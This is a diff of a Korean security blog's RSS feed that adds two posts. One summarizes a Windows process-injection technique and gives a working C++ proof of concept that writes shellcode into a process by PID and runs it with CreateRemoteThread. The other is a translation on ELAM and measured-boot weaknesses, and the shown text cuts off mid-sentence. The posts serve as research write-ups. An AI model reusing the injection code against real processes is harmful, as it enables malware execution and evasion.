@@ -9,8 +9,184 @@
     <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>hack &amp; life</description>
-    <pubDate>Thu, 24 Jun 2021 04:52:10 GMT</pubDate>
+    <pubDate>Mon, 28 Jun 2021 04:56:24 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>[하루한줄] Process Injection without Write/Execute Permission</title>
+      <link>https://hackyboiz.github.io/2021/06/28/idioth/2021-06-28/</link>
+      <guid>https://hackyboiz.github.io/2021/06/28/idioth/2021-06-28/</guid>
+      <pubDate>Mon, 28 Jun 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://xret2pwn.github.io//process-inection/&quot;&gt;Process In</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://xret2pwn.github.io//process-inection/">Process Injection without Write/Execute Permission</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>해당 블로그에서 non-writable allocation에 shellcode를 작성하고 non-executable allocation에서 이를 실행하는 방법이 공개되었습니다.</p><p>먼저 non-writable allocation에 <code>VirtualAlloc</code>을 통해 <code>PAGE_EXECUTE_READ</code> 권한을 부여하여 shellcode를 작성합니다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">void</span>* exec = VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READ);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Allocation created successfully %p \n&quot;</span>, exec);<span class="hljs-keyword">if</span> (WriteProcessMemory(GetCurrentProcess(), exec, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>)) &#123;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Shellcode wrote successfully.&quot;</span>);&#125;<span class="hljs-keyword">else</span> &#123;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] No permission to write the shellcode.&quot;</span>);&#125;</code></pre><p><img src="https://xret2pwn.github.io/assets/img/posts/Process_Injection/cpp_write_the_shellcode_executed.png" alt="screenshot_4"></p><p>성공적으로 shellcode가 작성됨을 확인할 수 있습니다. 그 후 해당 영역 (non-executable allocation)에 <code>PAGE_READONLY</code> 권한을 부여합니다. 하지만 DEP (Data Execution Prevention) 보호 기법으로 인해 메모리에서 직접 shellcode를 실행할 수 없습니다. 따라서 DEP가 걸려있지 않은 프로세스를 찾아 해당 프로세스에 shellcode를 injection 하면 읽기/쓰기 권한 없이 shellcode를 실행할 수 있습니다.</p><p>POC는 다음과 같습니다.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] =        <span class="hljs-string">&quot;\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b&quot;</span>        <span class="hljs-string">&quot;\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b&quot;</span>        <span class="hljs-string">&quot;\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24&quot;</span>        <span class="hljs-string">&quot;\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a&quot;</span>        <span class="hljs-string">&quot;\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0&quot;</span>        <span class="hljs-string">&quot;\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c&quot;</span>        <span class="hljs-string">&quot;\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a&quot;</span>        <span class="hljs-string">&quot;\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2&quot;</span>        <span class="hljs-string">&quot;\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f&quot;</span>        <span class="hljs-string">&quot;\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52&quot;</span>        <span class="hljs-string">&quot;\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33&quot;</span>        <span class="hljs-string">&quot;\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89&quot;</span>        <span class="hljs-string">&quot;\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c&quot;</span>        <span class="hljs-string">&quot;\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67&quot;</span>        <span class="hljs-string">&quot;\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3&quot;</span>        <span class="hljs-string">&quot;\x68\x70\x77\x6e\x58\x68\x52\x65\x74\x32\x31\xc9\x88\x4c\x24&quot;</span>        <span class="hljs-string">&quot;\x07\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff&quot;</span>        <span class="hljs-string">&quot;\x55\x08&quot;</span>;    HANDLE processHandle;    HANDLE remoteThread;    PVOID remoteBuffer;    DWORD oldPerms;    DWORD PID = <span class="hljs-number">17968</span>;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Injecting to PID: %i&quot;</span>, PID);    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);    remoteBuffer = VirtualAllocEx(processHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span> shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);    WriteProcessMemory(processHandle, remoteBuffer, shellcode, <span class="hljs-keyword">sizeof</span> shellcode, <span class="hljs-literal">NULL</span>);    VirtualProtectEx(processHandle, (LPVOID)<span class="hljs-keyword">sizeof</span>(processHandle), <span class="hljs-keyword">sizeof</span>(shellcode), PAGE_READONLY, &amp;oldPerms);    remoteThread = CreateRemoteThread(processHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);    CloseHandle(processHandle);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/process-injection/">process injection</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/cpp/">cpp</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/shellcode/">shellcode</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/redteam/">redteam</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/06/28/idioth/2021-06-28/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[Translation] Measured Boot와 멀웨어 시그니처: Windows Loader에서 발견된 두 가지 취약점</title>
+      <link>https://hackyboiz.github.io/2021/06/27/l0ch/measured-boot-vuln/</link>
+      <guid>https://hackyboiz.github.io/2021/06/27/l0ch/measured-boot-vuln/</guid>
+      <pubDate>Sun, 27 Jun 2021 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;p&gt;안녕하세요 L0ch입니다!&lt;/p&gt;
+&lt;p&gt;오늘은 Windows Kernel 및 Loader에서 발견된 취약점 두 개를 들고 왔는데요, 원래는 하루한줄로 간단하게 정리하려다 접할 기회가 많이 없는 Boot Security에 대한 설명 등 취약점의 이</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<p>안녕하세요 L0ch입니다!</p><p>오늘은 Windows Kernel 및 Loader에서 발견된 취약점 두 개를 들고 왔는데요, 원래는 하루한줄로 간단하게 정리하려다 접할 기회가 많이 없는 Boot Security에 대한 설명 등 취약점의 이해를 돕기 위한 내용이 잘 정리되어 있더라구요. 개인적으로 재밌게 읽어서 정리도 할 겸 번역글로 남겨봤습니다!</p><p>오역과 의역덩어리 번역글이니 지적은 매우 환영이에요..!</p><blockquote><p>원문 : <a href="https://bi-zone.medium.com/measured-boot-and-malware-signatures-exploring-two-vulnerabilities-found-in-the-windows-loader-5a4fcc3c4b66">Measured Boot and Malware Signatures: exploring two vulnerabilities found in the Windows loader</a></p></blockquote><hr><h1 id="Introduction-to-Boot-Security"><a href="#Introduction-to-Boot-Security" class="headerlink" title="Introduction to Boot Security"></a>Introduction to Boot Security</h1><p>Boot Security에는 Verified Boot와 Measured Boot라는 두 가지 주요 개념이 있다.</p><h2 id="Verified-Boot"><a href="#Verified-Boot" class="headerlink" title="Verified Boot"></a>Verified Boot</h2><p>Verified Boot 프로세스는 신뢰할 수 있는 디지털 서명이 되지 않은 구성 요소가 부팅 중에 실행되지 않도록 한다. 이 프로세스는 서명되지 않았거나 제대로 서명되지 않은 부팅 구성 요소 (예 : 부팅 관리자 및 펌웨어 드라이버)가 시스템에서 실행되는 것을 차단하는 기능인 Secure Boot로 구현된다.</p><h2 id="Measured-Boot"><a href="#Measured-Boot" class="headerlink" title="Measured Boot"></a>Measured Boot</h2><p>Measured Boot 프로세스는 부팅 중 실행하기 전 모든 구성 요소를 기록한다. 이는 변조 방지 방식(tamper-proof way)으로 유지되며 신뢰할 수 있는 플랫폼 모듈 (Trusted Platform Module, TPM)을 사용하여 구현된다. TPM은 펌웨어 및 중요 운영 체제 구성 요소의 해시를 저장하는 데 사용되어 악성 프로그램이 해시를 변경하는 것을 방지한다. </p><p>Verified Boot와 Measured Boot는 동시에 사용할 수 있다. 이러한 개념과 Windows에서의 구현에 대한 기술적 세부 사항은 <a href="https://edk2-docs.gitbook.io/understanding-the-uefi-secure-boot-chain/overview">Reference [1]</a>과 <a href="https://docs.microsoft.com/en-us/windows/security/information-protection/secure-the-windows-10-boot-process">Reference [2]</a>에서 찾을 수 있다.</p><p>위 두 가지 이외에도 다음과 같이 네 가지의 개념이 있다.</p><ul><li>Post-boot verification - 부팅 이후 확인</li><li>Booting from read-only media - 읽기 전용 미디어에서 부팅</li><li>Booting from a read-only volume(image) - 읽기 전용 볼륨(이미지)에서 부팅</li><li>pre-boot verification - 부팅 전 확인</li></ul><h2 id="Post-boot-verification"><a href="#Post-boot-verification" class="headerlink" title="Post-boot verification"></a>Post-boot verification</h2><p>Post-boot verification은 부팅 프로세스가 완료된 이후 또는 후반 단계에서 시작된 프로그램에 의해 수행된다. 해당 프로그램은 이전에 실행된 OS 구성요소와 데이터의 무결성을 확인한다. 이 방식은 더 높은 권한으로 실행 중인 멀웨어의 경우 프로그램의 파일 읽기 요청을 가로채고 반환되는 파일 데이터를 제어함으로써 우회가 가능하나 그럼에도 안티 멀웨어 소프트웨어, 엔드포인트 탐지 및 대응 솔루션과 암호화 구성 요소의 미티게이션으로써 사용할 가치가 있다.</p><h2 id="Booting-from-read-only-media"><a href="#Booting-from-read-only-media" class="headerlink" title="Booting from read-only media"></a>Booting from read-only media</h2><p>읽기 전용 미디어에서 부팅하는 것은 BIOS 및 UEFI와 같은 OS 시작 전 환경(pre-OS environment)에서 사용된다. 이러한 개념이 적용된 온라인 뱅킹을 위한 실시간 배포 방식은 이미 수년 전에 <a href="http://thinkinghard.com/secureinternetbanking/index.html">제안되었으며</a> 현재는 재택근무 시 보안을 위해 제안되기도 한다. 이는 기존의 전통적인 멀웨어에 완벽하게 대응해 대부분의 멀웨어로부터 시스템을 보호할 수 있다.</p><p>그러나 악성 프로그램이 OS 이전 환경에 접근할 수 있으면 우회가 가능하다. 이동식 미디어에서 부팅되는 OS를 속여 기존 미디어에 저장된 코드를 실행할 수 있다. 이는 BIOS 또는 UEFI가 부팅 드라이브에서 데이터를 읽을 때 기본 스토리지 드라이버로 전환하는 동안 트리거할 수 있으며 관련된 코드 실행 이슈에 대한 자세한 내용은 <a href="https://dfir.ru/2018/07/21/a-live-forensic-distribution-executing-malicious-code-from-a-suspect-drive/">이전 글에서</a> 확인할 수 있다.</p><h2 id="Booting-from-a-read-only-volume"><a href="#Booting-from-a-read-only-volume" class="headerlink" title="Booting from a read-only volume"></a>Booting from a read-only volume</h2><p>읽기 전용 볼륨(이미지)에서 부팅하는 것 또한 비슷한 개념이지만 변경 불가능한 OS 파일만 읽기 전용 볼륨에 저장된다. 이 볼륨은 해시 또는 해시 트리를 사용하여 무결성을 검증한다. 해시 또는 해시 트리의 루트 해시는 하드웨어로 보호되는 루트에 의해 서명되고 검증되며 이 접근 방식은 기존의 검증된 부팅 구현과 관련이 있다. 더 자세한 기술 정보는 <a href="https://source.android.com/security/verifiedboot/verified-boot">여기</a>서 찾을 수 있다.</p><h2 id="Pre-boot-verification"><a href="#Pre-boot-verification" class="headerlink" title="Pre-boot verification"></a>Pre-boot verification</h2><p>Pre-boot verification은 잘 알려지지 않은 기술이며 일반적으로 PCI (Peripheral Component Interconnect) 장치 또는 사용자 지정 UEFI 이미지로 구현된다. 부팅 드라이브에 있는 부트 로더를 시작하기 전에 확인 프로세스는 하드웨어 구성, 노출된 펌웨어 메모리, 실행 파일 및 기타 데이터 (예 : Windows Installation의 레지스트리 키값) 등의 무결성을 확인한다. </p><p>Pre-boot verification은 이전에는 초기화 코드를 포함하는 읽기 전용 메모리 (option ROM)가 있는 PCI 장치로 구현되었다. 초기화 코드는 부트 로더의 첫 번째 명령어 위치에 중단점을 설치해 중단점에 도달하면 PCI 장치의 메모리에서 사용자 지정 OS가 시작되는 프로세스로 이루어져 있다. OS는 연결된 드라이브에서 찾은 파일 시스템을 파싱하고 확인 프로세스를 수행하는데, 이때 해시는 무결성이 확인된 시스템 드라이브 또는 PCI 장치의 메모리에 저장되며 검증에 성공하면 원래 부트 로더가 실행되고 운영체제가 시작된다.</p><p>현재는 PCI 장치에서 사용자 지정 UEFI 이미지를 메인보드에 제공하는 것으로 구현되어 있다. 사용자 지정 UEFI 이미지에는 확인 프로세스에 필요한 파서가 포함되어 있으며 USB 부팅을 위해 USB 드라이브를 기반으로 한 구현도 있다. 이전 방식과 비교해 사용자가 부팅 순서를 변경하지 않는다는 가정하에 BIOS / UEFI 환경에 대한 중단점 또는 애드온을 사용하여 부팅 프로세스에 간섭할 필요가 없다.</p><p>이 접근 방식은 BIOS 및 UEFI를 포함한 펌웨어의 무결성을 확인하는 기능이 제한되지만, 사용자 지정 UEFI 이미지를 사용하면 설계상 신뢰할 수 있는 영역에 대부분의 펌웨어를 포함하게 된다.</p><p>또 다른 단점은 공식 Windows에서 구현된 파일 시스템 및 Windows 레지스트리 파싱 코드를 동일하게 생성하는 것이 거의 불가능하다는 것이다. 일반적으로 Linux 사용자가 NTFS 파일 시스템을 마운트 하면 동일한 파일 시스템을 탐색하는 Windows 사용자와 동일한 디렉터리 레이아웃과 파일 내용이 표시된다. 그러나 Pre-boot verification은 실제로 드라이브에 저장된 원시 데이터는 동일하나 다른 데이터를 반환할 수 있다. </p><p>예를 들어 대부분의 Pre-boot verification 제품은 Windows 레지스트리 트랜잭션 로그 파일을 지원하지 않는다. 즉, Kernel 수준에서 실행되는 멀웨어가 레지스트리 키값을 수정해 Pre-boot verification에서 임의의 값을 가져오도록 할 수 있다. Windows Kernel은 트랜잭션 로그 파일을 지원하므로 이러한 변경 사항은 부팅 도중과 부팅 후에 운영체제에 표시된다. 이는 <a href="https://dfir.ru/2018/10/07/hiding-data-in-the-registry/">이전 글에서</a> 자세히 설명되어 있다.  </p><p>verified 및 measured boot 프로세스는 코드와 데이터를 사용하기 전 검증하기 때문에 앞서 설명한 공격에 대한 영향을 받지 않을 것으로 예상된다. 실행될 파일이 파일 시스템 드라이버에 따라 다른 해시를 생성하는 경우 파일이 verified 및 measured를 거쳐 동일한 드라이버로 실행되기 때문에 보안에 영향을 미치지 않는다. 그러나 이 접근 방법 또한 항상 완벽하지는 않다. 이 글에서는 Windows Loader (<code>winload.exe</code> 또는 <code>winload.efi</code>)의 measured boot에서 발견된 두 가지 취약점에 중점을 둘 것이며, 별도의 소프트웨어 구성 요소(이후에 설명할 Loader와 kernel)에서 데이터와 코드를 검증하는 과정에서의 이슈에 대해 강조한다.</p><h1 id="Early-Launch-Anti-Malware"><a href="#Early-Launch-Anti-Malware" class="headerlink" title="Early Launch Anti-Malware"></a>Early Launch Anti-Malware</h1><p>취약점을 살펴보기 전에 Windows Kernel (<code>ntoskrnl.exe</code>)에서 제공하는 안티 멀웨어 인터페이스를 살펴본다.</p><p>두 가지의 주요 부팅 보안인  verified boot와 measured boot가 활성화되어 있고 하드웨어/펌웨어 취약점을 고려하지 않는 경우 멀웨어의 초기 목표 삽입 지점은 boot-start 드라이버다.</p><p>악성 boot-start 드라이버를 방지하기 위해 Microsoft는 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/early-launch-antimalware">ELAM (Early Launch Anti-Malware) 인터페이스</a>를 Windows 8에서부터 도입했다. </p><p>ELAM 드라이버는 다른 드라이버보다 먼저 시작해 종속성과 유효성을 검사한다. 각 boot-start 드라이버에 대해 ELAM 드라이버는 다음 값을 반환한다.</p><ul><li>unknown - 알 수 없음</li><li>good - 정상적인 드라이버</li><li>bad - 악성 드라이버</li><li>bad but critical for the boot - 악성 드라이버지만 부팅 프로세스에 빠져서는 안 될 요소</li></ul><p>또한 ELAM 드라이버는 boot-start 드라이버에서 수행하는 레지스트리 작업을 기록하는 콜백을 설정하고 런타임 안티 멀웨어의 구성 요소에 저장할 수 있다.</p><p>자체 ELAM 드라이버를 사용하는 안티 멀웨어 소프트웨어는 Windows 8.1에서 도입된 <a href="https://docs.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-">코드 무결성 보호</a>가 제공되어 보호된 서비스로 실행할 수 있다. </p><p>부팅 프로세스 중에 둘 이상의 ELAM 드라이버가 활성화될 수 있으며 각 ELAM 드라이버는 지정된 boot-start 드라이버를 독립적으로 확인하며 이 드라이버에 대한 최종 결과값은 다음 순위를 기반으로 한다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled.png" alt="measured-boot-vuln/Untitled.png"></p><blockquote><p>Table 1. ELAM scores (ranks)</p></blockquote><p>한 ELAM 드라이버가 <code>good</code> 을 반환하고 다른 ELAM 드라이버가 <code>bad</code>를 반환하면 이 boot-start 드라이버는 <code>bad</code>로 결정된다.</p><p>위 ELAM 드라이버의 반환 값과 아래 정책을 기반으로 Kernel은 boot-start 드라이버를 허용하거나 거부할 수 있다.</p><ul><li>모든 드라이버 허용</li><li><code>good</code>, <code>unknown</code>, <code>bad but critical</code> 드라이버 허용(기본값)</li><li><code>good</code>, <code>unknown</code> 드라이버 허용</li><li><code>good</code> 드라이버 허용</li></ul><p>ELAM 드라이버는 다음 데이터를 기반으로 드라이버의 스코어를 결정한다.</p><ul><li>드라이버 파일의 경로</li><li>해당 서비스 항목에 대한 레지스트리 경로</li><li>드라이버에 대한 인증서 정보 (게시자, 발급자)</li><li>이미지 파일 해시값</li></ul><p>문제는 <a href="https://www.microsoft.com/security/blog/2020/09/01/force-firmware-code-to-be-measured-and-attested-by-secure-launch-on-windows-10/">DRTM (Dynamic Root of Trust for Measurement for Measurement)</a>이 적용되면 이전에 boot-start 드라이버를 메모리로 읽어오는 데 사용된 펌웨어를 신뢰할 수 없어 관련 드라이버가 초기화되기 전에는 드라이브에서 아무것도 읽을 수 없기 때문에 파일 내용이 ELAM 드라이버에 노출되지 않는다. 따라서 기존의 멀웨어 시그니처는 적용할 수 없다. 그러나 경로, 해시 및 인증서 등의 정보로 악성 boot-start 드라이버를 차단하는 것은 효과적인 방법으로 볼 수 있다.</p><p>따라서 Microsoft는 다음과 같은 새로운 규칙을 정의했다.</p><ul><li>ELAM 드라이버에는 단일 boot-start 드라이버를 확인할 수 있는 제한된 시간이 주어짐</li><li>ELAM 드라이버에는 모든 boot-start 드라이버를 확인할 수 있는 제한된 시간이 주어짐</li><li>ELAM 드라이버에는 코드 및 구성 데이터에 대해 제한된 메모리가 제공됨</li><li>ELAM 드라이버는 ELAM 레지스트리 하이브 (<code>C:\Windows\System32\config\ELAM</code>)의 특정 레지스트리 키 아래에 서명을 저장해야 함</li><li>ELAM 드라이버는 서명의 유효성을 검사해야 함.</li><li>ELAM 드라이버는 잘못된 서명을 처리해야 함 (이 경우 모든 boot-start 드라이버를 unknown으로 처리해야 함).</li><li>ELAM 드라이버는 악성 boot-start 드라이버 (또는 다른 정책 위반)가 식별되면 측정된 부팅 상태를 무효화해야 함</li></ul><p>ELAM 인터페이스가 처음 등장했을 때는 <a href="https://www.welivesecurity.com/2012/12/27/win32gapz-new-bootkit-technique/">효용성에 의문이 제기되었다</a>. bootkit은 악성코드를 VBR(Volume Boot Recod)에 기록하거나 IPL(Initial Program Loader)로 대체할 수 있으며 둘 다 Windows Kernel 이전에 실행되므로 ELAM 드라이버를 우회할 수 있었다. 그러나 Verified/Measured 부팅의 등장으로 위 기법의 적용이 어려워져 ELAM 인터페이스가 제 기능을 할 수 있게 되었다.</p><h1 id="ELAM-and-Measured-Signatures"><a href="#ELAM-and-Measured-Signatures" class="headerlink" title="ELAM and Measured Signatures"></a>ELAM and Measured Signatures</h1><p>Measured 부팅 중 ELAM 시그니처를 읽은 다음 Windows Loader에서 측정한다(<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/elam-driver-requirements#malware-signatures">출처</a>). 이렇게 하면 ELAM 시그니처가 신뢰 체인에 배치되어 증명 중에 누락 혹은 다운그레이드 된 시그니처를 감지할 수 있다.</p><p>ELAM 하이브 내의 특정 레지스트리 값에 저장된 위치만 측정되며 이 값을 <code>Measured</code>, <code>Policy</code> 및 <code>Config</code>라고 한다. 여기에는 공급 업체별 데이터를 포함할 수 있고 이름이 다르거나 유형이 <code>REG_BINARY</code>가 아닌 레지스트리 값은 측정되지 않는다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%201.png" alt="measured-boot-vuln/Untitled%201.png"></p><blockquote><p>Table 2. Trend Micro 및 Microsoft에서 각각 저장한 시그니처 데이터와 측정값(굵게 표시됨)</p></blockquote><p>ELAM 시그니처는 Windows Loader에 의해 측정되지만 ELAM 인터페이스는 Windows Kernel에 의해 제공된다는 점이 중요하다.</p><h1 id="Real-World-ELAM-Drivers"><a href="#Real-World-ELAM-Drivers" class="headerlink" title="Real-World ELAM Drivers"></a>Real-World ELAM Drivers</h1><p>2021 년 2월에 필자는 유명한 안티 멀웨어 제품의 ELAM 드라이버를 리버싱했다. 25개의 ELAM 드라이버가 있는 총 26 개의 제품 (2 개의 제품이 동일한 ELAM 드라이버를 공유)에서 24 개가 기본 구성으로 설치되어 있었다. </p><p>흥미롭게도 모든 ELAM 드라이버에는 보호된 안티 멀웨어 서비스를 시작하는 데 필요한 인증서 정보가 포함되어 있지만 26개 중 15개 제품에서 boot-start 드라이버에 대해 검사를 수행하지 않고 하드코딩된 결과값을 반환하거나 결과값을 전혀 제공하지 않았다. </p><blockquote><p>이러한 ELAM 드라이버를 placeholder driver라고 한다.</p></blockquote><p>두 개의 ELAM 드라이버는 런타임 안티 멀웨어 구성 요소에 대한 boot-start 드라이버 정보를 기록했지만 ELAM 드라이버에서는 실제 검사가 수행되지 않았으며 결과값은 항상 <code>unknown</code>이었고, 한 ELAM 드라이버는 검사를 수행하지 않고 모든 boot-start 드라이버의 결과값을 <code>good</code>으로 보고했다.</p><p>11개의 제품의 ELAM 드라이버는 boot-start 드라이버에 대해 몇 가지 검사를 수행했다. 그중 하나는 알려진 정상적인 인증서의 하드코딩된 목록을 가지고 있고 ELAM 하이브는 시그니처 데이터를 저장하는 데 사용되지 않았으며 2개는 시그니처 데이터에 ELAM 하이브와 SYSTEM 하이브를 모두 사용했다. 하나는 ELAM 하이브를 사용한 뒤 SYSTEM 하이브를 시그니처 데이터 대체로 사용하고 7개의 제품은 ELAM 하이브에서만 시그니처 데이터를 읽었다.</p><p>11 개의 ELAM 드라이버 중 단 2개만 결과값에 따라 증명을 취소할 수 있었으며 다른 드라이버는 해당 루틴을 호출조차 하지 않았다.</p><p>이제 제품의 이름을 언급하도록 하겠다.</p><p>놀랍게도 Windows Defender에서 제공되는 ELAM 드라이버는 언급된 모든 규칙을 따르지 않았으며 SYSTEM 하이브를 시그니처 데이터의 저장 위치로 사용하고 (기본 위치 인 ELAM 하이브 제외) 악성 boot-start 드라이버가 감지되었을 때 증명을 취소하지 않았다.</p><p>Kaspersky 및 ZoneAlarm 제품의 동일한 ELAM 드라이버는 ELAM 하이브와 SYSTEM 하이브 두 위치에서 시그니처 데이터를 읽었으며 증명 또한 취소되지 않았다.</p><p>Sophos 제품의 ELAM 드라이버는 모든 boot-start 드라이버를 <code>good</code>으로 표시한다. 이는 Sophos에 보안 이슈로 보고되었지만 보안 상의 결함이 없는 의도된 기능으로 간주되었다.</p><p>요약하자면, 대부분의 안티 멀웨어 제품은 ELAM 드라이버를 사용하여 악성 boot-start 드라이버를 검색하지 않았다. 대신 ELAM 드라이버를 사용하여 자체적으로 보호된 서비스로 시작하고 핵심 ELAM 기능은 하드 코딩된 단일 결과값을 제공하거나 결과값을 전혀 제공하지 않도록 구현되었다.</p><h1 id="ELAM-Hive"><a href="#ELAM-Hive" class="headerlink" title="ELAM Hive"></a>ELAM Hive</h1><p>ELAM 하이브는 <code>C:\Windows\System32\config\ELAM</code> 레지스트리 파일에 저장된다.</p><p><a href="https://github.com/msuhanov/regf/blob/master/Windows%20registry%20file%20format%20specification.md">이전 글에</a> 해당 포맷에 대한 설명이 있으며 취약성을 이해하는 데 필요한 몇 가지 핵심 사항이 있다.</p><ul><li>키 노드는 하위 키 목록을 가리킬 수 있다.<ul><li>키 노드 : 단일 레지스트리 키를 설명하는 데 사용되는 바이너리 구조</li><li>하위 키 목록 : 레지스트리 키의 하위 키를 설명하는 키 노드에 대한 오프셋 목록</li></ul></li><li>마찬가지로 키 노드는 값 목록을 가리킬 수 있다.<ul><li>값 목록: 키 값에 대한 오프셋 목록, 각 키 값은 레지스트리 키에 속하는 단일 레지스트리 값을 설명함</li></ul></li><li><code>0xFFFFFFFF</code>와 같은 오프셋은 “nil”을 표현한다.</li><li>이러한 오프셋은 절댓값이 아니며 레지스트리 파일의 시작 부분에서 오프셋을 얻으려면 4096 bytes를 추가해야 한다.</li><li>키 노드와 키 값은 각각 레지스트리 키의 이름과 레지스트리 값의 이름을 저장한다. 이는 확장 ASCII (Latin-1) 문자열 혹은 UTF-16LE 문자열이다. (확장 ASCII 문자열로 저장할 수 있으면 해당 형식으로 압축됨.)</li><li>하위 키에서 대소문자를 구분하지 않는 바이너리 검색을 사용하려면 하위 키 목록을 대문자 이름(사전 순 정렬)으로 정렬해야 한다.<ul><li>값 목록은 정렬할 필요 없음</li></ul></li><li>키 값은 레지스트리 값의 데이터 유형(예 : REG_BINARY)을 저장하고 값 데이터를 가리킨다.</li><li>4 bytes 이하의 값 데이터는 키 값에 직접 저장된다.</li><li>4 bytes 보다 큰 값 데이터는 다른 오프셋에 저장되며 이 오프셋은 키 값에 기록된다.</li><li>16344 bytes보다 큰 값 데이터는 16344 btyes 이하의 세그먼트에 저장되고 세그먼트에 대한 오프셋은 목록에서 참조된다. 키 값에는 데이터 대신 목록에 대한 오프셋이 저장된 Big Data Record의 오프셋이 저장된다.</li></ul><p>레지스트리 파일의 예제는 다음과 같다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%202.png" alt="measured-boot-vuln/Untitled%202.png"></p><blockquote><p>Figure 1<br>선택된 영역 - ELAM 하이브의 root key 노드<br>녹색 - 하위 키의 개수(2개)<br>빨간색 - 하위 키 목록에 대한 오프셋 (0x3328, 절대 오프셋: 0x3328+4096=0x4328)<br>노란색 - 키 이름 (“ROOT”, ASCII 문자열)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%203.png" alt="measured-boot-vuln/Untitled%203.png"></p><blockquote><p>Figure 2<br>선택된 영역 - 루트 키에 대한 하위 키 목록<br>노란색 - 목록의 요소 수 (2개)<br>빨간색 - 두 개의 하위 키에 대한 오프셋 (0x3188 및 0x0120, 이 유형의 하위 키 목록에서는 4 개)</p></blockquote><p>각 오프셋 뒤에는 이름 해시가 포함되어 있으며 사전 순 정렬로 저장된다. (<code>0x3188</code>은 “Trend Micro” 키 노드에 해당하고 <code>0x0120</code>은 “Windows Defender” 키 노드에 해당됨)</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%204.png" alt="measured-boot-vuln/Untitled%204.png"></p><blockquote><p>Figure 3<br>선택된 영역 - “Windows Defender” 키 노드<br>빨간색 - 값 데이터(1)<br>노란색 - 목록에 대한 오프셋 